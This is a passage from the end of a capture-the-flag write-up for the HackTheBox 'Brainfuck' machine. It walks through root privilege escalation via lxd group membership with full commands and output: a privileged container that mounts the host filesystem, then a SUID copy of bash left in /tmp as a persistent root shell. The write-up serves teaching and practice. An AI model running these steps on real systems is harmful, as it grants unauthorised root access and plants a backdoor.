Image imported with fingerprint: cd73881adaac667ca3529972c7b380af240a9e3b09730f8c8e4e6a23e1a7892b
orestis@brainfuck:~$ lxc image list
+---------+--------------+--------+-------------------------------+--------+--------+-----------------------------+
|  ALIAS  | FINGERPRINT  | PUBLIC |          DESCRIPTION          |  ARCH  |  SIZE  |         UPLOAD DATE         |
+---------+--------------+--------+-------------------------------+--------+--------+-----------------------------+
| myimage | cd73881adaac | no     | alpine v3.8 (20230604_21:30) | x86_64 | 3.11MB | Jun 4, 2023 at 1:25pm (UTC) |
+---------+--------------+--------+-------------------------------+--------+--------+-----------------------------+
```

- Initialize the image inside a new container:

```shell
orestis@brainfuck:~$ lxc init myimage ignite -c security.privileged=true
Creating ignite
```

- Mount the container inside the `/root` directory:

```shell
orestis@brainfuck:~$ lxc config device add ignite mydevice disk source=/ path=/mnt/root recursive=true
Device mydevice added to ignite
```

- Start the container and get an interactive shell:

```shell
orestis@brainfuck:~$ lxc start ignite
orestis@brainfuck:~$ lxc exec ignite /bin/sh
~ # whoami;hostname;id;ip a
root
ignite
uid=0(root) gid=0(root)
1: lo: <LOOPBACK,UP,LOWER_UP> mtu 65536 qdisc noqueue state UNKNOWN qlen 1
    link/loopback 00:00:00:00:00:00 brd 00:00:00:00:00:00
    inet 127.0.0.1/8 scope host lo
       valid_lft forever preferred_lft forever
    inet6 ::1/128 scope host 
       valid_lft forever preferred_lft forever
4: eth0@if5: <BROADCAST,MULTICAST,UP,LOWER_UP,M-DOWN> mtu 1500 qdisc noqueue state UP qlen 1000
    link/ether 00:16:3e:9c:38:66 brd ff:ff:ff:ff:ff:ff
    inet6 fe80::216:3eff:fe9c:3866/64 scope link 
       valid_lft forever preferred_lft forever
```

**Now, we should be able to get the root flag in `/mnt/root/root`:**
```shell
~ # ls -lah /mnt/root/root/
total 32K    
drwx------    4 root     root        4.0K Oct  3  2022 .
drwxr-xr-x   23 root     root        4.0K Sep 15  2022 ..
lrwxrwxrwx    1 root     root           9 Sep 15  2022 .bash_history -> /dev/null
-rw-r--r--    1 root     root        3.0K Oct 22  2015 .bashrc
drwx------    2 root     root        4.0K May  5  2017 .cache
-rw-------    1 root     root          66 Oct  3  2022 .mysql_history
drwxr-xr-x    2 root     root        4.0K Oct  3  2022 .nano
-rw-r--r--    1 root     root         148 Aug 17  2015 .profile
-r--------    1 root     root          33 Apr 29  2017 root.txt
```

**But before we do that, I'll copy the Bash shell and set it to SUID sticky bit. So that we have a root shell on the target system:**
```shell
~ # cp /mnt/root/bin/bash /mnt/root/tmp/root_bash
~ # chmod +s /mnt/root/tmp/root_bash 
~ # exit
orestis@brainfuck:~$ ls -lah /tmp/root_bash 
-rwsr-sr-x 1 root root 1014K Jun  4 16:35 /tmp/root_bash
```

```shell
orestis@brainfuck:~$ /tmp/root_bash -p
root_bash-4.3# whoami;hostname;id;ip a
root
brainfuck
uid=1000(orestis) gid=1000(orestis) euid=0(root) egid=0(root) groups=0(root),4(adm),24(cdrom),30(dip),46(plugdev),110(lxd),121(lpadmin),122(sambashare),1000(orestis)
1: lo: <LOOPBACK,UP,LOWER_UP> mtu 65536 qdisc noqueue state UNKNOWN group default qlen 1
    link/loopback 00:00:00:00:00:00 brd 00:00:00:00:00:00
    inet 127.0.0.1/8 scope host lo
       valid_lft forever preferred_lft forever
    inet6 ::1/128 scope host 
       valid_lft forever preferred_lft forever
2: ens160: <BROADCAST,MULTICAST,UP,LOWER_UP> mtu 1500 qdisc mq state UP group default qlen 1000
    link/ether 00:50:56:b9:91:d4 brd ff:ff:ff:ff:ff:ff
    inet 10.10.10.17/24 brd 10.10.10.255 scope global ens160
       valid_lft forever preferred_lft forever
    inet6 dead:beef::250:56ff:feb9:91d4/64 scope global mngtmpaddr dynamic 
       valid_lft 86400sec preferred_lft 14400sec
    inet6 fe80::250:56ff:feb9:91d4/64 scope link 
       valid_lft forever preferred_lft forever
3: lxdbr0: <BROADCAST,MULTICAST,UP,LOWER_UP> mtu 1500 qdisc noqueue state UP group default qlen 1000
    link/ether fe:95:02:08:b7:36 brd ff:ff:ff:ff:ff:ff
    inet6 fe80::b4fc:9ff:fe7c:d101/64 scope link 
       valid_lft forever preferred_lft forever
    inet6 fe80::1/64 scope link 
       valid_lft forever preferred_lft forever
5: veth98R2N3@if4: <BROADCAST,MULTICAST,UP,LOWER_UP> mtu 1500 qdisc noqueue master lxdbr0 state UP group default qlen 1000
    link/ether fe:95:02:08:b7:36 brd ff:ff:ff:ff:ff:ff link-netnsid 0
    inet6 fe80::fc95:2ff:fe08:b736/64 scope link 
       valid_lft forever preferred_lft forever
```

I'm root! :D

Now I'm have effective UID as the root user outside of the container!

## Rooted

**root.txt:**
```shell
root_bash-4.3# cat /root/root.txt 
{Redacted}
```

![](https://github.com/siunam321/CTF-Writeups/blob/main/HackTheBox/Brainfuck/images/Pasted%20image%2020230604213749.png)

# Conclusion

What we've learned:

1. Enumerating SMTP, POP3, IMAP
2. Exploiting WordPress Plugin "Support Plus Responsive Ticket System 7.1.3"
3. Enumerating Subdomains Via SSL Certificate's Subject Alternative Name (SAN)
4. Enumerating Emails Via IMAP
5. Deciphering Vigenere Cipher
6. Cracking SSH Private Key Passphrase
7. Vertical Privilege Escalation Via lxd/lxc Group